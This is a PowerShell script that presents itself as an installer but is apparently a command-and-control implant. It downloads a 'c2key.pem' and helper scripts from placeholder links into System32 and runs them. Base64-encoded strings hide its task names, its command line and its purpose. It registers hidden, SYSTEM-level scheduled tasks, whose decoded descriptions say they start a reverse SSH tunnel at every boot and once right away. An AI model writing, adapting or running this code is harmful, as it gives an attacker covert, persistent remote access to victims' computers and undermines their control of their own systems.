Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force


function Keys-Setup{
	
	$downloadKeyURL = "c2key.pem link"
	$keyPath = "C:\ProgramData\c2key.pem"

	$downloadKeyScriptURL = "key.ps1 link"
	$keyScriptPath = "C:\Windows\System32\key.ps1"
	try{
		Invoke-WebRequest -Uri $downloadKeyURL -OutFile $keyPath -UseBasicParsing
		Invoke-WebRequest -Uri $downloadKeyScriptURL -OutFile $keyScriptPath -UseBasicParsing
	}
	catch{Write-Host "key and key script Download failed"}

	try{
	& C:\Windows\System32\key.ps1
	}
	catch{Write-Host "Key Script didnt run"}
	}



function New-StartupTask {
    
    # Download the main script first
    $downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String( "test.ps1 base64 encoded link"))
    $scriptPath = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QzpcV2luZG93c1xTeXN0ZW0zMlxzZXJ2aWNlLnBzMQ=="))
    
    Write-Host "Downloading main script from $downloadUrl..."
    try {
        Invoke-WebRequest -Uri $downloadUrl -OutFile $scriptPath -UseBasicParsing
        Write-Host "Main script downloaded successfully to $scriptPath" -ForegroundColor Green
    } catch {
        Write-Host "ERROR: Failed to download main script. Message: $($_.Exception.Message)" -ForegroundColor Red
        return
    }
    
    # --- HARD-CODED VALUES ---
    $TaskName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U1NIVEVTVA=="))
    $Command = $scriptPath
    $Description = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RhcnRzIHRoZSByZXZlcnNlIFNTSCB0dW5uZWwgYXQgc3lzdGVtIGJvb3Qu"))
    $OneTimeTaskName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U1NIVEVTVF9JTUFFRURJQVRF"))
    # --- END OF HARD-CODED VALUES ---

    Write-Host "Attempting to create startup task named '$TaskName'..."

    try {
        # 1. Create the regular startup task
        $taskAction = New-ScheduledTaskAction -Execute ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cG93ZXJzaGVsbC5leGU="))) -Argument ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxl")) + " `"$Command`"")
        $taskTrigger = New-ScheduledTaskTrigger -AtStartup
        $taskPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
        $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        
        Register-ScheduledTask -TaskName $TaskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Description $Description -Force
        Write-Host "Successfully created startup task '$TaskName'." -ForegroundColor Green

        # 2. Create identical one-time task that runs immediately
        $oneTimeAction = New-ScheduledTaskAction -Execute ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cG93ZXJzaGVsbC5leGU="))) -Argument ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxl")) + " `"$Command`"")
        $oneTimeTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
        $oneTimeTrigger.EndBoundary = (Get-Date).AddMinutes(10).ToString("yyyy-MM-ddTHH:mm:ss")
        $oneTimePrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
        $oneTimeSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        
        Register-ScheduledTask -TaskName $OneTimeTaskName -Action $oneTimeAction -Trigger $oneTimeTrigger -Principal $oneTimePrincipal -Settings $oneTimeSettings -Description ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T25lLXRpbWUgZXhlY3V0aW9uIG9mIHJldmVyc2UgU1NIIHR1bm5lbA=="))) -Force
        Write-Host "Successfully created one-time task '$OneTimeTaskName'." -ForegroundColor Green
        
        Write-Host "One-time task will execute in 5 seconds..." -ForegroundColor Yellow
        
    } catch {
        Write-Host "ERROR: Failed to create scheduled tasks. Message: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Check if running as administrator
$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ERROR: This script must be run as Administrator" -ForegroundColor Red
    exit 1
}

# Run the function
Keys-Setup
New-StartupTask

# Wait 3 seconds then close
Write-Host "Installer completed. Closing in 3 seconds..." -ForegroundColor Green
Start-Sleep 3
Stop-Process -Id $PID -Force
